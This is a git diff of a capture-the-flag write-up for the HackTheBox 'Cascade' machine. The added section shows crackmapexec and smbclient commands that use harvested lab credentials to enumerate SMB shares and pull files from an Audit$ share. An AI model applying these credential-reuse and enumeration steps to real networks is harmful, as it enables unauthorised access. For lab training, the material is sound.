@@ -63,7 +63,7 @@ Host script results:
 |_  start_date: 2024-06-15T12:03:41
 ```
 
-## SMB Enumeration
+## SMB Enumeration (Part 1)
 
 Could not list any shares but compiled a list of users vie `enum4linux` and `crackmapexec`:
 
@@ -202,7 +202,7 @@ HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985
 WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva
 ```
 
-## SMB Enumeration (Contd.)
+## SMB Enumeration (Part 2)
 
 Used credentials and `smbmap` to enumerate shares.
 
@@ -308,7 +308,51 @@ Mode                LastWriteTime         Length Name
 -a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
 ```
 
+# Root Flag
 
+## SMB Enumeration (Part 3)
+
+Used the credentials to enumerate shares again and found a new share titled `Audit$`:
+
+```bash
+crackmapexec smb 10.10.10.182 -u s.smith -p sT333ve2 --shares
+
+SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
+SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
+SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
+SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
+SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
+SMB         10.10.10.182    445    CASC-DC1         Audit$          READ            
+SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
+SMB         10.10.10.182    445    CASC-DC1         Data            READ            
+SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
+SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
+SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
+SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
+```
+
+Used `smbclient` to connect to `Audit$` share:
+
+```bash
+smbclient //10.10.10.182/audit$ --user s.smith --password sT333ve2
+
+smb: \> dir
+  .                                   D        0  Wed Jan 29 18:01:26 2020
+  ..                                  D        0  Wed Jan 29 18:01:26 2020
+  CascAudit.exe                      An    13312  Tue Jan 28 21:46:51 2020
+  CascCrypto.dll                     An    12288  Wed Jan 29 18:00:20 2020
+  DB                                  D        0  Tue Jan 28 21:40:59 2020
+  RunAudit.bat                        A       45  Tue Jan 28 23:29:47 2020
+  System.Data.SQLite.dll              A   363520  Sun Oct 27 06:38:36 2019
+  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 06:38:38 2019
+  x64                                 D        0  Sun Jan 26 22:25:27 2020
+  x86                                 D        0  Sun Jan 26 22:25:27 2020
+```
+
+Pulled files to kali machine and viewed `Audit.db` in `sqlitebrowser`:
+
+![database](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Cascade/Images/Database.png)
 
 
 
